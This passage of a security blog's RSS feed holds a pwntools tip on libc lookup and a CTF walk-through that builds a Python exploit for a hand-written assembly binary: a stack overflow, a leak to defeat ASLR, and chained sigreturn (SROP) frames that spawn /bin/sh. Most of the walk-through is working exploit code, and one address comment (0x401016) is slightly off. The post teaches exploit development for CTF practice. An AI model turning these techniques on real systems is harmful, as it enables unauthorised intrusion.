for it, <code>pwntools</code> will attempt a syscall instead, using SIGRET/SROP. I&rsquo;ve written about this
technique in the past.</p>
<p><a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">Abusing Signals with SIGROP</a></p>
<p>Happy refactoring, and see you next time!</p>
]]></content>
        </item>
        
        <item>
            <title>Pwntool Tips 1</title>
            <link>https://ctrl.red/posts/2020/01/pwntool-tips-1/</link>
            <pubDate>Thu, 02 Jan 2020 20:56:48 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2020/01/pwntool-tips-1/</guid>
            <description>Do you like clean exploit scripts? Do you fidget with and refactor them long after you&amp;rsquo;ve submitted the flag? If so, then this blog series is right up your alley!
At some point you&amp;rsquo;ll be developing an exploit that requires you to return to some shared library, most likely libc. Problem is there&amp;rsquo;s a good chance the libc on your local dev box is not same version as the one on the remote box.</description>
            <content type="html"><![CDATA[<p>Do you like clean exploit scripts? Do you fidget with and refactor them long after you&rsquo;ve submitted
the flag? If so, then this blog series is right up your alley!</p>
<p>At some point you&rsquo;ll be developing an exploit that requires you to return to some shared library,
most likely <code>libc</code>. Problem is there&rsquo;s a good chance the <code>libc</code> on your local dev box is not same
version as the one on the remote box. You may already know about the <code>libc</code> database <a href="https://github.com/niklasb/libc-database">here on
GitHub</a>. You&rsquo;ll have to leak a few addresses from the
remote box in order to be able to search for the right version.</p>
<p>You can also look up addresses on a webapp that uses the <code>libc</code> database as a backend.
<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
<p><img src="2.png" alt="blukat"></p>
<p>Instead of keeping 2 sets of addresses and offsets (local and remote) you can use the <code>pwnlib.libcdb</code>
<a href="http://docs.pwntools.com/en/stable/libcdb.html?highlight=libcdb#module-pwnlib.libcdb">Pwntool&rsquo;s module</a></p>
<p>Once you&rsquo;ve identified which <code>libc</code> is on the remote server, you can take its buildid or hash and
pop it into pwntools. Then you can start rop-chaining or symbol searching right from the comfort of
your exploit script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leaked_got_read <span style="color:#f92672">=</span> leak_read()
exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)

<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;remote&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv:
    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
<span style="color:#66d9ef">else</span>:
    dl_libc <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>search_by_md5(<span style="color:#e6db74">&#34;50390b2ae8aaa73c47745040f54e602f&#34;</span>)
    libc <span style="color:#f92672">=</span> ELF(dl_libc)

libc_base <span style="color:#f92672">=</span> leaked_got_read  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
</code></pre></div><p>Debug log output during script execution shows that pwntools is handling the file download and
caching for you.</p>
<p>First run:</p>
<pre tabindex="0"><code class="language-log" data-lang="log">[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f
[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/hashes/md5/50390b2ae8aaa73c47745040f54e602f': 70B

[DEBUG] Downloading data from LibcDB: https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so
[+] Downloading 'https://gitlab.com/libcdb/libcdb/raw/master/libc/libc6_2.27-3ubuntu1_amd64/lib/x86_64-linux-gnu/libc-2.27.so': 1.94MB
</code></pre><p>Second run:</p>
<pre tabindex="0"><code class="language-log" data-lang="log">[DEBUG] Found existing cached libc at '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
[*] Using cached data from '/home/red/.pwntools-cache/libcdb/md5/50390b2ae8aaa73c47745040f54e602f'
</code></pre><p>That&rsquo;s all for today&rsquo;s Pwntools quick tips!</p>
]]></content>
        </item>
        
        <item>
            <title>Abusing Signals with SIGROP Exploits</title>
            <link>https://ctrl.red/posts/2019/12/abusing-signals-with-sigrop-exploits/</link>
            <pubDate>Sat, 28 Dec 2019 21:59:34 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2019/12/abusing-signals-with-sigrop-exploits/</guid>
            <description>TMHC: MiniPwn Walk-through This one&amp;rsquo;s just as much for me as it is for you. They say you don&amp;rsquo;t truly understand something until you&amp;rsquo;re able to teach it to someone else. So here we go!
The Many Hats Club had a CTF on HackTheBox a few weekends ago that re-ignited a previous passion for exploit development. The reason it got me interested was that it required a new exploit technique of which I&amp;rsquo;d not yet heard, Signal Return Oriented Programming.</description>
            <content type="html"><![CDATA[<p><img src="1.png" alt=""></p>
<h1 id="tmhc-minipwn-walk-through">TMHC: MiniPwn Walk-through</h1>
<p>This one&rsquo;s just as much for me as it is for you. They say you don&rsquo;t truly understand something until
you&rsquo;re able to teach it to someone else. So here we go!</p>
<p>The Many Hats Club had a CTF on HackTheBox a few weekends ago that re-ignited a previous passion for
exploit development. The reason it got me interested was that it required a new exploit technique
of which I&rsquo;d not yet heard, Signal Return Oriented Programming. Check out
<a href="https://pdfs.semanticscholar.org/5c48/3c22bf9a761d6b900b6acdbad72b321f39ee.pdf">this whitepaper</a></p>
<h2 id="whats-sropsigrop">What&rsquo;s SROP/SIGROP?</h2>
<p>Basically, if you can control the Accumulator Register (AX) and reach a SYSCALL instruction,
you can send a SIGRET signal to the process. You can read more about
<a href="http://man7.org/linux/man-pages/man7/signal.7.html">Signals here.</a>
When a process receives a SIGRET signal, it takes the current stack frame and writes it to the
registers. If you&rsquo;re controlling the stack, then you can ostensibly create your own set of registers
in a manner that places you in a more advantageous position during your exploit.</p>
<h2 id="the-challenge">The Challenge</h2>
<p>The challenge was a very small binary, hand written in assembly. The stack was not executable (NX),
and even if you had gadgets, there&rsquo;s nowhere all that useful to jump.</p>
<p>Here&rsquo;s the <code>strace</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ strace ./pwn
execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./pwn&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;./pwn&#34;</span><span style="color:#f92672">]</span>, 0x7ffcfe4a4a50 /* <span style="color:#ae81ff">57</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
read<span style="color:#f92672">(</span>0, AAAAAAA
<span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 300<span style="color:#f92672">)</span>               <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
write<span style="color:#f92672">(</span>1, <span style="color:#e6db74">&#34;AAAAAAA\n&#34;</span>, 8AAAAAAA
<span style="color:#f92672">)</span>                <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>                                 <span style="color:#f92672">=</span> ?
</code></pre></div><p>So it just echos back what we type at it.</p>
<p>Here&rsquo;s the complete assembly (with comments by me):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">
_start:           <span style="color:#75715e">; 0x400000</span>
<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x40101e</span>   <span style="color:#75715e">; push _write</span>
<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x0</span>    <span style="color:#75715e">; 1st arg to the upcoming syscall. read from FD 0, STDIN</span>
<span style="color:#a6e22e">mov</span>    rsi,rsp    <span style="color:#75715e">; copy stack pointer to RSI, the 2nd argument for the upcoming syscall</span>
<span style="color:#a6e22e">sub</span>    rsi,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; subtract 0x8 from where the stack starts; the buffer will be 8 bytes</span>
<span style="color:#a6e22e">mov</span>    edx,<span style="color:#ae81ff">0x12c</span>  <span style="color:#75715e">; use 300 as the 3rd argument to the upcoming read syscall, count</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x0</span>    <span style="color:#75715e">; set the first argument to 0, which is sys_READ</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; get user input; IMPORTANT: return value (input length) goes to RAX</span>
<span style="color:#a6e22e">ret</span>                                                                                               
                                                                                                  
_write:           <span style="color:#75715e">; 0x40101e</span>
<span style="color:#a6e22e">push</span>   <span style="color:#ae81ff">0x40103c</span>   <span style="color:#75715e">; push _exit</span>
<span style="color:#a6e22e">mov</span>    rsi,rsp    <span style="color:#75715e">; 2nd arg, buffer location</span>
<span style="color:#a6e22e">sub</span>    rsi,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; move back 8 bytes</span>
<span style="color:#a6e22e">mov</span>    edx,<span style="color:#ae81ff">0x8</span>    <span style="color:#75715e">; how much data to write, 8 bytes</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x1</span>    <span style="color:#75715e">; which syscall to run; 1 = sys_WRITE</span>
<span style="color:#a6e22e">mov</span>    edi,<span style="color:#ae81ff">0x1</span>    <span style="color:#75715e">; which descriptor to write to; 1 = STDOUT</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; write buffer to stdout</span>
<span style="color:#a6e22e">ret</span>                                                                                               
                                                                                                  
_exit:            <span style="color:#75715e">; 0x40103c</span>
<span style="color:#a6e22e">mov</span>    eax,<span style="color:#ae81ff">0x3c</span>   <span style="color:#75715e">; 60; exit syscall</span>
<span style="color:#a6e22e">syscall</span>           <span style="color:#75715e">; exit</span>
</code></pre></div><p>That&rsquo;s it.</p>
<p>So let&rsquo;s get into an overview of what our solution is going to entail. The first thing to know is
that our buffer is 8 bytes. We can determine that by either looking at the assembly or with the
traditional pattern create/query. We&rsquo;ll also need know the binary&rsquo;s security measures. The remote
box has ASLR enabled, which we would have found later; we&rsquo;ll proceed with that as a given.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</code></pre></div><p>We can take two paths from here. We can SIGROP an mprotect syscall to re-enable execution on the
stack. Doing so would enable execution of shellcode from the stack again, defeating NX. Or we can
SIGROP to the execve syscall and spawn <code>/bin/sh</code>. Mprotect is the easier path, and is the intended
solution. It wasn&rsquo;t the path I initially took.</p>
<p>Being the glutton for punishment that I am, let&rsquo;s continue with the execve syscall route.</p>
<p>The return value from <code>SYS_read</code> is the size of bytes read and is stored at <code>RAX</code>. <code>RAX</code> also
happens to be where the <code>syscall</code> instruction looks to see which syscall function it should be
running. <code>SYS_sigreturn</code> is syscall 15 according to
<a href="https://filippo.io/linux-syscall-table/">this handy syscall table.</a></p>
<p>Here&rsquo;s our plan:</p>
<ol>
<li>Overwrite the stack and force an address leak.
<ul>
<li>Calculate some consistent known offset since ASLR is on.</li>
</ul>
</li>
<li>Restart the program without quitting, setting it back to a vulnerable state</li>
<li>Overwrite again, this time setting up a read <code>SYS_sigreturn</code>
<ul>
<li>Since we can hand-write the stack frame that ends up in the registers, we&rsquo;ll set <code>$RSP</code> to our
known offset. Additionally, we&rsquo;ll set up a <code>SYS_read</code> in the frame so we can continue sending the
binary some more data.</li>
</ul>
</li>
<li>Set up  our buffer for more control flow and add another SIGRET frame, this time for <code>SYS_execve</code></li>
<li>Trigger the SIGRET by sending 15 bytes</li>
<li>Maybe shell</li>
</ol>
<h2 id="the-exploit">The Exploit</h2>
<p>I took the opportunity, as a supplemental exercise, to also get very familiar with the <code>pwntools</code>
exploit-writing library for Python. I&rsquo;ll be trying to use as few &lsquo;magic&rsquo; numbers as possible and
use the library to its fullest potential.</p>
<p>This is the skeleton I&rsquo;m going to start with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">setup_pipe</span>(gdb_commands):
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]&#34;</span>)

    context<span style="color:#f92672">.</span>clear(
        arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>,
        terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;splitw&#34;</span>, <span style="color:#e6db74">&#34;-h&#34;</span>]
    )

    opt <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;debug&#34;</span>:
        context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>,
        io <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug(BIN, gdb_commands)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;remote&#34;</span> <span style="color:#f92672">&amp;&amp;</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
        HOST, PORT <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
        io <span style="color:#f92672">=</span> remote(HOST, PORT)
    <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;local&#34;</span>:
        io <span style="color:#f92672">=</span> process(BIN)
    <span style="color:#66d9ef">else</span>:
        log<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Run mode missing: [debug, local, remote &lt;server&gt; &lt;port&gt;]&#34;</span>)

    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Run mode: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(opt))
    <span style="color:#66d9ef">return</span> io

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:

    commands <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    b _start
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    elf, rop <span style="color:#f92672">=</span> ELF(BIN), ROP(BIN)
    io  <span style="color:#f92672">=</span> setup_pipe(commands)

    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    EXPLOIT CODE GOES HERE
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</code></pre></div><p>We can start by declaring some constants that we&rsquo;ll need for the exploit. Let&rsquo;s get some info first:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; disass _start
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _start:
   0x0000000000401000 &lt;+0&gt;:     push   0x40101e
   0x0000000000401005 &lt;+5&gt;:     mov    edi,0x0
   0x000000000040100a &lt;+10&gt;:    mov    rsi,rsp
   0x000000000040100d &lt;+13&gt;:    sub    rsi,0x8
   0x0000000000401011 &lt;+17&gt;:    mov    edx,0x12c
   0x0000000000401016 &lt;+22&gt;:    mov    eax,0x0
   0x000000000040101b &lt;+27&gt;:    syscall
   0x000000000040101d &lt;+29&gt;:    ret

pwndbg&gt; disass _write
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> _write:
   0x000000000040101e &lt;+0&gt;:     push   0x40103c
   0x0000000000401023 &lt;+5&gt;:     mov    rsi,rsp
   0x0000000000401026 &lt;+8&gt;:     sub    rsi,0x8
   0x000000000040102a &lt;+12&gt;:    mov    edx,0x8
   0x000000000040102f &lt;+17&gt;:    mov    eax,0x1
   0x0000000000401034 &lt;+22&gt;:    mov    edi,0x1
   0x0000000000401039 &lt;+27&gt;:    syscall
   0x000000000040103b &lt;+29&gt;:    ret
</code></pre></div><p>From here, we generate our address constants:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall   <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span> <span style="color:#75715e"># 0x401016</span>
ret2read  <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span> <span style="color:#75715e"># 0x401016</span>
ret2write <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_write <span style="color:#f92672">+</span> <span style="color:#ae81ff">17</span> <span style="color:#75715e"># 0x40102f</span>
_start    <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>  <span style="color:#75715e"># we want to skip pushing _write to the stack</span>

OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
SIGRET_FRAME_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">248</span>
SLEEP <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</code></pre></div><p>Building our first overwrite of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Overflow the next two return addresses:
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">First, ret to (mov eax,0x1) to cause a write syscall. Doing this
</span><span style="color:#e6db74">makes execution skip the part of _write that sets the output length
</span><span style="color:#e6db74">to just 8. This makes it print the 0x12c bytes set at 401011,
</span><span style="color:#e6db74">causing pointer leaks
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Next, ret to _start+5 to skip pushing _write at 0x401000. This also
</span><span style="color:#e6db74">sets up the binary to begin listening again with an 8 byte buffer,
</span><span style="color:#e6db74">putting it back into an overflowable/vulnerable state.
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Sending initial payload to leak pointers&#34;</span>)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+=</span> p64(ret2write) <span style="color:#75715e"># Leak pointers</span>
data <span style="color:#f92672">+=</span> p64(_start)    <span style="color:#75715e"># Reset</span>
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we deal with the data that we&rsquo;ve forced the application to echo back to us:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">The 4th giant-word is an environment variable pointer.
</span><span style="color:#e6db74">&#39;&amp;&#39; it with 0xfffffffffffff000 to find the beginning of the page.
</span><span style="color:#e6db74">This is our new, known base/offset that remains consistent between
</span><span style="color:#e6db74">runs, even with ASLR
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
leaks <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv()
pointer <span style="color:#f92672">=</span> leaks[<span style="color:#ae81ff">3</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
stack_leak <span style="color:#f92672">=</span> u64(pointer) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
log<span style="color:#f92672">.</span>warn(<span style="color:#e6db74">&#39;leaked stack: &#39;</span> <span style="color:#f92672">+</span> hex(stack_leak))
</code></pre></div><p>We can create a function that will generate us our SIGRET frame to keep the code a little cleaner:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Build a SIGRETURN SYS_read frame that reads 2000 bytes.
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_read</span>(read_location):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_read
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>STDIN_FILENO
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>
    frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> read_location
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> bytes(frame)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Overflow again thanks to the SYS_read we setup from the 1st payload
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">First, reset binary to into a read state.  To this read, we will
</span><span style="color:#e6db74">soon pass 15 bytes to manipulate RAX (read return value of # bytes read)
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Next, ret to a syscall to trigger the SIGRETURN
</span><span style="color:#e6db74">Also, send the SIGRETURN Frame 
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Sending stage 2 which seeds the first SIGRETURN frame&#34;</span>)
pause(SLEEP)
data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> OFFSET
data <span style="color:#f92672">+=</span> p64(ret2read)
data <span style="color:#f92672">+=</span> p64(syscall)
data <span style="color:#f92672">+=</span> sigreturn_read(stack_leak)
p<span style="color:#f92672">.</span>send(data)
</code></pre></div><p>Now we trigger the SIGRET by sending 15 bytes (remember the SIGRET number is 15 and the return
value of <code>SYS_read</code> is the number of bytes read, and this return value gets stored in RAX)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Trigger SIGRETURN by sending 15 bytes to the binary when it&#39;s
</span><span style="color:#e6db74">reading, which sets RAX to 15. When execution meets a syscall
</span><span style="color:#e6db74">instruction, the frame above will replace all the register values
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Triggering the first SIGRETURN by sending 15 junk bytes&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
</code></pre></div><p>The SIGRET frame we built earlier has now been pulled into the registers.</p>
<pre tabindex="0"><code>rax = 0 # SYS_read
rdi = 0 # STDIN File Descriptor
rsi = our calculated page-start address
rdx = 2000 # arg to sys_READ for how many bytes to read
rsp = our calculated page-start address
rip = our syscall address
</code></pre><p>Execution continues to a <code>syscall</code> instruction, because that&rsquo;s where we set RIP in our frame. Given
our now known stack-base, we can now build out our own stack and track our own offsets. We&rsquo;ll set
up another SYS_read which will read 15 bytes to set RAX and then ret to a syscall to trigger the
SIGRETURN. We can calculate where the end of the payload (previous 2 instruction plus our custom
stack frame) will be. Once triggered, <code>/bin/sh</code> will be at RSP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Build a SYS_execve SIGRETURN frame that will execute /bin/sh
</span><span style="color:#e6db74">The binsh address in the stack will eventually hold &#39;/bin/sh&#39;
</span><span style="color:#e6db74">followed by a pointer to null, followed by a pointer to binsh&#39;s
</span><span style="color:#e6db74">pointer, in order to satisfy execve&#39;s second argument, and array
</span><span style="color:#e6db74">of args, hence the +16
</span><span style="color:#e6db74">execve(*program, *args{program, null}, null)
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sigreturn_execve</span>(binsh_addr):
    frame <span style="color:#f92672">=</span> SigreturnFrame()
    frame<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve
    frame<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> binsh_addr
    frame<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> binsh_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>
    frame<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    frame<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> syscall
    <span style="color:#66d9ef">return</span> frame


binsh <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>

payload  <span style="color:#f92672">=</span> p64(ret2read)
payload <span style="color:#f92672">+=</span> p64(syscall)

end_of_payload <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">+</span> len(payload) <span style="color:#f92672">+</span> SIGRET_FRAME_SIZE <span style="color:#f92672">+</span> len(binsh)

frame <span style="color:#f92672">=</span> sigreturn_execve(end_of_payload)
frame<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> end_of_payload
payload <span style="color:#f92672">+=</span> bytes(frame)
<span style="color:#75715e"># ^ &#39;end_of_payload&#39;</span>
payload <span style="color:#f92672">+=</span> binsh
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
payload <span style="color:#f92672">+=</span> p64(end_of_payload)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Reset to vuln state
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload&#34;</span>)
p<span style="color:#f92672">.</span>send(p64(ret2read))
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> OFFSET <span style="color:#f92672">+</span> payload)

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">Send 15 bytes to trigger SIGRETURN again, executing /bin/sh
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Triggering the last SIGRETURN&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
p<span style="color:#f92672">.</span>interactive()

</code></pre></div><p>That should be all we need. When we run our final payload, we get:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py local
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
